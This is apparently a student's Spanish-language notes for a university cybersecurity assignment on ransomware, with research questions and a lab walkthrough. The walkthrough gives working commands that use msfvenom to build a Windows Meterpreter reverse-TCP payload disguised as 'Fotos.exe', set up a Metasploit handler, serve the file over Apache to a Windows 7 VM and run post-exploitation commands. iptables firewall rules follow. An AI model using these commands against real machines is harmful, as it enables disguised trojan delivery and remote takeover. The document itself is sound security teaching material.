# Info
Apoyo
[Google drive profe](https://drive.google.com/drive/folders/1ltz_dNvsPAmWGl8aKHMr1_4YH1xGgG94)
Descarga [Kali Linux](https://www.kali.org/get-kali/#kali-virtual-machines) y su [Documentacion](https://www.kali.org/docs/) y la de sus [Herramientas](https://www.kali.org/tools/)
- `extras/Adjuntos/1_2_2_Actividad_Generacion_de_un_Malware_JCalderon.pdf`
Apoyarse con [[999 - Archivado/IPtables|IPtables]]
## Contexto
Una empresa naviera sufrió un ataque de tipo Ransomware. Este [[020 - Conceptos/020.2 - Seguridad/Malware|Malware]] llegó a través de un archivo del tipo Office al correo de uno de los empleados, y rápidamente infectó los servidores críticos cifrando el contenido, dejando a la empresa inhabilitada para funcionar por varios días. Los ciberdelincuentes solicitaron un rescate en Bitcoin que la empresa tuvo que pagar para recuperar sus activos críticos.
## Instrucciones

### ITEM I: Investige acerca de los malware del tipo ramsomware. 
Nota: Es importante que use sus propias palabras, no se acepta copy-paste y referencie la fuente
1. Qué es un ransomware y qué principios de la ciberseguridad vulnera, y cómo nos podemos proteger
2. Qué vulnerabilidad aprovechó el ransomware WannaCry, y cómo se puede solucionar. (indique parche asociado)
3. Realice una descripción de qué es Ethernalblue y Doublepulsar.
4. Qué otros malware del tipo ransomware han afectado a las organizaciones a nivel mundial, describa 5.

### ITEM II: Entrege Recomendaaciones (Al menos 3) a la empresa para evitar ser, nuevamente, victima de este tipo de ataque. Liste y Describa ampliamente las recomendaciones (5 Puntos)

### ITEM III: Haga un Analisis del archivo FOTOS.EXE (10 puntos)
Nota1: Debera usar MSFVENOM para generar el archivo "FOTOS.EXE" y generar el ataque de "REVERSE_TCP", este archivo estara ubicado en Descargas y Entregue los IoC(Indicadores de Compomiso) de ese archivo (IP, HASH) y recomendaciones de seguridad. Incluir Capturas de pantalla.
Nota2: Usar VM "Win 7 IE" y los sitios [URLSCAN](), [Virustotal]() o alguna otra.

### ITEM IV: Generar politicas de Firewall e IPtables (5 Puntos)
Nota1: Usar VM "Kali Linux" y Evidenciar configuraciones en el informe
- Generar Politicas de `INPUT/OUTPUT/FORWARD` por defecto `ACCEPT`, 
- Permitir solo el uso del puerto `80` para aceptar conexiones de la maquina cliente `win7`, los demas servicios estaran bloqueados
- Habilitar Politica para rechazar las conexiones al puerto 22 desde fuera de la red
- Bloquar Dominio `www.facebook.com` para que la maquina kali no pueda acceder a esta URL

## Desarrollo
Primero que nada la configuracion de esto:
acceder a la configuracion de Kali Linux > Red > Adaptador 1 y dejarlo en "NAT", Luego ir a Adaptador 2 y dejarlo en "Red Interna" con el nombre de "intnet", luego abrir advance y en el modo promiscuo con "permitir todo"

Me funciono dejando la configuracion de los dos adaptadores como adaptadores puentes a la misma salida ethernet, por lo que usaria la red de mi casa como local :p

Kali Linux
Abre una terminal
```
sudo su
```
Poner el teclado en español (es o latam)
```
setxkbmap es
```
Crear virus
Nota: lhost usa la ip de la maquina kali de la red nat
```
msfvenom -p windows/meterpreter/reverse_tcp lhost=10.0.2.15 lport=4444 -f exe -a x86 > Fotos.exe
```
Ingresar Consola
```
msfconsole
```
Cargar Exploit
```
use exploit/multi/handler
```
```
set payload windows/meterpreter/reverse_tcp
```
```
set lhost 10.0.2.15
```
```
set lport 4444
```
```
exploit
```
Crear carpeta compartida apache
```
mkdir -p /var/www/html/shares
```
mover Fotos.exe
```
mv /Fotos.exe /var/www/html/shares
```
Activar servidor Apache2
```
service apache2 start
service apache2 status
```

EN WINDOWS7 -> Acceder a la ip de kali(`10.0.2.15`) desde Win7 y descargar `Fotos.exe`

Comprobar conexion desde kali
```
sysinfo
screenshot
mkdir "Hola Mundo"
nc -vlp 4444
```

---
IPTables en Kali:

Comandos iniciar/Reiniciar/Detener Firewall
```
service iptables start
service iptables restart
service iptables stop
```
Ver reglas de salida firewall Generales/Input/Output
```
iptables -nvL
iptables -nv -L Input
iptables -nv -L Output
```
Aceptar Politicas por defecto "ACCEPT"
```
iptables -P INPUT ACCEPT
iptables -P OUTPUT ACCEPT
iptables -P FORWARD ACCEPT
```
Permitir solo el puerto 80 para las conexiones con Win7, los demas bloqueados (IPIPA)
```
iptables -A INPUT -p tcp --destination-port 80 -m iprange --src-range 192.168.1.10-192.168.1.200 -j ACCEPT
```
Habilitar politica para rechazar conexiones puerto 22 fuera de la red
```
iptables -A INPUT -m state --state NEW -m tcp -p tcp --dport 22 -j DROP
```
Bloquear Dominio [www.facebook.com](http://www.facebook.com/) para que la maquina kali no pueda acceder a esa url
```
iptables -A OUTPUT -p tcp -d www.facebook.com -j DROP
iptables -A OUTPUT -p tcp -d facebook.com -j DROP
iptables -A INPUT -p tcp -d www.facebook.com -j DROP
iptables -A INPUT -p tcp -d facebook.com -j DROP
```
Guardar Reglas Firewall en caso de/Restaurar
```
iptables-save > /root/reglas.firewall
iptables-restore < /root/reglas.firewall
```

Terminado
- `extras/Adjuntos/Instrucciones Evaluación 1 Terminada.pdf`